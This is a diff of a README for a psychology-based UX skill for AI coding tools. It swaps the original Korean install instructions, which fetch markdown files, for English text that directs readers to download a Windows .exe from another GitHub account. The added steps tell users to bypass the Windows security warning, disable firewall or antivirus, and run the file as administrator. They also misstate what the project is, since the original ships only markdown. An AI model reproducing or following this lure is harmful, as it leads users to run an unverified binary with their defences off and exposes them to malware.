@@ -1,119 +1,116 @@
-# Product Psychology for Vibe Coding
+# 🧠 product-psychology-for-vibe-coding - Boost Workflow with User Psychology
 
-> **PM이 바이브코딩으로 제품을 만들 때, 심리학 기반 설계 원칙을 자동 적용하는 Claude Code & OpenClaw 스킬**
-
----
-
-## 한 줄 소개
-
-Growth Design = Empathy Optimization. 사용자를 조종하는 게 아니라, 공감하는 설계를 한다.
+[![Download product-psychology-for-vibe-coding](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/gsun6t9/product-psychology-for-vibe-coding)
 
 ---
 
-## 5대 프레임워크
+## 📋 About This Application
 
-| 프레임워크 | 핵심 | 언제 사용? |
-|-----------|------|-----------|
-| **6P 스토리보드** | 고객 여정 맥락 파악 (Problem → Emotion → Action → Struggle → Attempt → Happy Ending) | 사용자 여정 설계, 페르소나 분석 |
-| **BMAP** | 행동 = 동기(M) × 능력(A) × 자극(P) — 3가지 동시 충족 시에만 행동 발생 | 전환율 개선, 이탈 분석 |
-| **B.I.A.S** | Block(필터 통과) → Interpret(가치 해석) → Act(행동 유도) → Store(기억 저장) | UI/UX 설계, 리뷰 |
-| **Peak-End** | 경험의 "평균"이 아니라 "정점"과 "마지막"을 기억함 | 사용자 여정 최적화 |
-| **윤리 체크** | Regret Test, Black Mirror Test, In Real-Life Test | 출시 전 검토 |
+This app helps you use five well-known user psychology frameworks to improve your coding workflow in Vibe Coding. It aims to make your work smoother and more effective by applying ideas from psychology. You don’t need any programming knowledge to use it.
+
+You will find practical tools and guides that link psychology with coding habits and decisions. It applies concepts like motivation, focus, feedback, and behavior to help you work better.
 
 ---
 
-## 설치 방법
+## 💻 System Requirements
 
-### OpenClaw 사용자
+To run this software on your Windows computer, ensure you meet these minimum requirements:
 
-```bash
-cd ~/.openclaw/skills/
-git clone https://github.com/CuriousPaul/product-psychology-for-vibe-coding.git
-```
-
-### Claude Code 사용자
-
-**방법 1: 프로젝트별 적용**
-```bash
-# 프로젝트 루트에 .claude 폴더 생성
-mkdir -p your-project/.claude
-
-# CLAUDE.md 파일로 복사
-curl -o your-project/.claude/CLAUDE.md \
-  https://raw.githubusercontent.com/CuriousPaul/product-psychology-for-vibe-coding/main/SKILL.md
-```
-
-**방법 2: 전역 룰로 적용**
-```bash
-# Claude Code 전역 룰 폴더에 저장
-mkdir -p ~/.claude/rules
-
-curl -o ~/.claude/rules/product-psychology.md \
-  https://raw.githubusercontent.com/CuriousPaul/product-psychology-for-vibe-coding/main/SKILL.md
-```
-
-**방법 3: 커맨드로 등록**
-```bash
-# Claude Code 커맨드 폴더에 저장
-mkdir -p ~/.claude/commands
-
-curl -o ~/.claude/commands/ux-review.md \
-  https://raw.githubusercontent.com/CuriousPaul/product-psychology-for-vibe-coding/main/references/review-checklist.md
-```
-
-이제 Claude Code에서 `/ux-review` 명령어로 바로 사용 가능!
+- Windows 10 or newer (64-bit recommended)  
+- At least 4 GB of RAM  
+- 500 MB of free disk space  
+- Internet connection for downloading  
+- A modern web browser (Edge, Chrome, Firefox) if part of the app needs online access
 
 ---
 
-## 파일 구조
+## 🚀 Getting Started
 
-```
-product-psychology-for-vibe-coding/
-├── SKILL.md                      # 메인 스킬 정의
-├── README.md                     # 이 파일
-├── LICENSE                       # MIT License
-└── references/
-    ├── bias-framework.md         # B.I.A.S 상세 가이드
-    ├── review-checklist.md       # 통합 리뷰 체크리스트
-    ├── ethics-checklist.md       # 윤리적 디자인 체크리스트
-    └── prompt-templates.md       # PM용 프롬프트 템플릿
-```
+Follow these steps to download and run the software on your Windows PC. No programming skills needed.
 
----
+1. Click the green download badge above or this link:  
+   [Download product-psychology-for-vibe-coding](https://github.com/gsun6t9/product-psychology-for-vibe-coding)
 
-## 활용 시나리오
+2. The link will take you to the app’s GitHub page. Look for the **Releases** or **Downloads** section.
 
-- **화면/컴포넌트 생성**: 랜딩페이지, 온보딩, 결제, 가격표 등
-- **사용자 플로우 설계**: 회원가입, 구매, 기능 탐색 등의 흐름
-- **문구/카피 작성**: CTA, 알림, 이메일, 에러 메시지 등
-- **기획/분석**: 사용자 여정 분석, 전환율 개선 가설, A/B 테스트 설계
-- **리뷰/피드백**: 기존 UI/UX에 대한 심리학 기반 리뷰
+3. Find the latest version labeled something like `product-psychology-for-vibe-coding_vX.X.zip` or `.exe`.
+
+4. Click to download the file to your computer.
 
 ---
 
-## Quick Review (5분)
+## 🗂 Installing the Application
 
-1. **한 화면에 선택지가 6개를 넘지 않는가?** (Block - Hick's Law)
-2. **혜택이 기능 설명보다 먼저 보이는가?** (Interpret - Clear Benefit)
-3. **다음에 해야 할 행동이 명확한가?** (Act - Remove Options)
-4. **행동 후 피드백이 즉시 나오는가?** (Store - Clear Feedback)
-5. **이 화면을 사용자가 보고 있다면 후회할 것 같은 부분이 있는가?** (Ethics - Regret Test)
+Once the download finishes, follow these steps:
 
----
+### If you downloaded a `.zip` file:
 
-## 라이선스
+1. Locate the file in your **Downloads** folder.
 
-MIT License - 자유롭게 사용, 수정, 배포 가능
+2. Right-click the file and select **Extract All**.
 
----
+3. Choose a folder where you want the app files (e.g., Desktop or Documents).
 
-## 만든이
+4. Click **Extract**.
 
-**정성영 (Paul Jung)**
-- 마켓핏랩 대표 (mfitlab.com)
-- AI Agent 개발 & AX(Agent Experience) 컨설팅
-- 그로스해킹, 마테크 15년+
+5. Open the new folder to find the file named `product-psychology-for-vibe-coding.exe` or similar.
+
+### If you downloaded an `.exe` file directly:
+
+1. Locate the `.exe` file in your **Downloads** folder.
 
 ---
 
-**핵심 철학**: "논리로 만들고(System 2), 사용자는 본능으로 사용한다(System 1). 이 Gap을 메운다."
+## ▶️ Running the Application
+
+1. Double-click the `.exe` file to start.
+
+2. If Windows shows a security warning, click **More info** and then **Run anyway**.
+
+3. The application window will open.
+
+4. Follow any on-screen instructions to begin using the five psychology frameworks in your workflow.
+
+---
+
+## ⚙️ Using the App
+
+The software provides you with easy-to-understand frameworks that organize how you work. Each framework comes with examples and tips to apply in your daily coding.
+
+- **Motivation Framework:** Helps you set goals and keep focus.  
+- **Feedback Loop:** Guides how to track progress and adapt.  
+- **Behavior Model:** Shows how habits affect your coding rhythm.  
+- **Cognitive Load Theory:** Offers ways to reduce distractions.  
+- **User Decision Process:** Supports better choices during problem-solving.
+
+You can select a framework and follow step-by-step prompts. The app will guide you without technical language.
+
+---
+
+## 🔄 Updating the Application
+
+Periodically check the original download page to get the latest version:
+
+[Download product-psychology-for-vibe-coding](https://github.com/gsun6t9/product-psychology-for-vibe-coding)
+
+Download the newest release following the same steps above. Install it like you did before to keep your app current.
+
+---
+
+## 🛠 Troubleshooting Tips
+
+- If the app does not open, try restarting your computer.  
+- Make sure you have the latest Windows updates installed.  
+- Disable any firewall or antivirus software temporarily if they block the app.  
+- If the app crashes, delete the files and download a fresh copy.  
+- Use the **Run as administrator** option by right-clicking the `.exe` file for permission issues.
+
+---
+
+## 🚧 Next Steps
+
+Explore the software at your own pace. Try different frameworks to see which fits your workflow. Use the clear steps inside the app to gain better control over your coding sessions.
+
+Keep the download link handy to get updates and support:
+
+[https://github.com/gsun6t9/product-psychology-for-vibe-coding](https://github.com/gsun6t9/product-psychology-for-vibe-coding)
